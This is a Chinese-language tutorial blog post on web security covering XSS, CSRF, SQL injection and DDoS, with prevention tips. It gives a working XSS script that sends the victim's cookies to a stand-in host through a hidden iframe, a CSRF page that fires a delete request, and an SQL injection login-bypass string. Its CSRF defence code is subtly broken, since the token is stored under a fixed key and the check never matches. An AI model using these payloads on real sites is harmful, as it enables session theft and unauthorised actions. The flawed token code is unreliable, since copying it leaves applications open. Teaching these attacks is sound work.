---
layout: post
title:  "网络安全"
date:   2018-12-25
tags: 安全
---

# 网络安全

## XSS：跨站脚本（Cross-site scripting）
XSS 全称“跨站脚本”，是注入攻击的一种。其特点是不对服务器端造成任何伤害，而是通过一些正常的站内交互途径，例如发布评论，提交含有 JavaScript 的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本。

### 可能只是简单的恶作剧
```js
while (true) {
    alert("你关不掉我~");
}
```
### 也可以是盗号或者其他未授权的操作
```html
<!-- 用 <script type="text/javascript"></script> 包起来放在评论中 -->
<script type="text/javascript">
(function(window, document) {
    // 构造泄露信息用的 URL
    var cookies = document.cookie;
    var xssURIBase = "http://localhost:2000/myxss/";
    var xssURI = xssURIBase + window.encodeURI(cookies);
    // 建立隐藏 iframe 用于通讯
    var hideFrame = document.createElement("iframe");
    hideFrame.height = 0;
    hideFrame.width = 0;
    hideFrame.style.display = "none";
    hideFrame.src = xssURI;
    // 开工
    document.body.appendChild(hideFrame);
})(window, document);
</script> 
```
### 预防
不要相信用户提交的内容，对提交的字符串进行过滤。

## CSRF：跨站请求伪造（Cross-site request forgery）
CSRF 的全称是“跨站请求伪造”，而 XSS 的全称是“跨站脚本”。看起来有点相似，它们都是属于跨站攻击——不攻击服务器端而攻击正常访问网站的用户，但前面说了，它们的攻击类型是不同维度上的分 类。CSRF 顾名思义，是伪造请求，冒充用户在站内的正常操作。我们知道，绝大多数网站是通过 cookie 等方式辨识用户身份（包括使用服务器端 Session 的网站，因为 Session ID 也是大多保存在 cookie 里面的），再予以授权的。所以要伪造用户的正常操作，最好的方法是通过 XSS 或链接欺骗等途径，让用户在本机（即拥有身份 cookie 的浏览器端）发起用户所不知道的请求。
严格意义上来说，CSRF 不能分类为注入攻击，因为 CSRF 的实现途径远远不止 XSS 注入这一条。通过 XSS 来实现 CSRF 易如反掌，但对于设计不佳的网站，一条正常的链接都能造成 CSRF。
## 例如
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<body>
<a href="http://localhost:2000/topic/delete?id=1">
    点击领取金币
</a>
<img src="http://localhost:2000/topic/delete?id=1">
</body>
</html>
```
当用户访问页面就会用用户的账号进行操作
### 预防
设置令牌
```python

csrf_tokens = dict()

@main.route("/")
def index():
    # board_id = 2
    board_id = int(request.args.get('board_id', -1))
    if board_id == -1:
        ms = Topic.all()
    else:
        ms = Topic.find_all(board_id=board_id)
    token = str(uuid.uuid4())
    u = current_user()
    csrf_tokens['token'] = u.id
    bs = Board.all()
    return render_template("topic/index.html", ms=ms, token=token, bs=bs)

@main.route("/delete")
def delete():
    id = int(request.args.get('id'))
    token = request.args.get('token')
    u = current_user()
    # 判断 token 是否是我们给的
    if token in csrf_tokens and csrf_tokens[token] == u.id:
        csrf_tokens.pop(token)
        if u is not None:
            print('删除 topic 用户是', u, id)
            Topic.delete(id)
            return redirect(url_for('.index'))
        else:
            abort(404)
    else:
        abort(403)

```

```js
<a class="topic_title" href="{{ url_for('topic.delete', id=t.id, token=token) }}">
    删除
</a>
```

## SQL注入
所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。
### 例如
```python
def select(conn):
    # 一个注入的用户名
    usr = 'abc" or "1"="1'
    pwd = 'abc'
    sql = '''
    SELECT
        id, username, email
    FROM
        users
    WHERE
        username="{}" and password="{}"
    '''.format(usr, pwd)
    # 读取数据
    cursor = conn.execute(sql)
    print('所有数据', list(cursor))
    # for row in cursor:
    #     print(row)
```
### 预防
永远不要信任用户的输入，对用户的输入进行校验，不要使用动态拼装sql。

## DDOS攻击
DDOS 里面的 DOS 是 denial of service（停止服务）的缩写，表示这种攻击的目的，就是使得服务中断。最前面的那个 D 是 distributed （分布式），表示攻击不是来自一个地方，而是来自四面八方，因此更难防。
举例来说：应该类似攻击餐馆门口的前台排号机（Gateway），很少真的过去消费。300个人混在30个真实客户里面，然后取完号（Token）就走，过了号继续取号，前台每次都必须叫三遍这个号才能过号，结果就是想消费的客户一直在等待，前台一直忙着叫号和过号。

### 预防
- 专用硬件，Web 服务器的前面可以架设硬件防火墙，专门过滤请求。
- 本机防火墙，操作系统都带有软件防火墙，Linux 服务器一般使用 iptables。
- Web 服务器， 如：nginx，Apache可以过滤请求
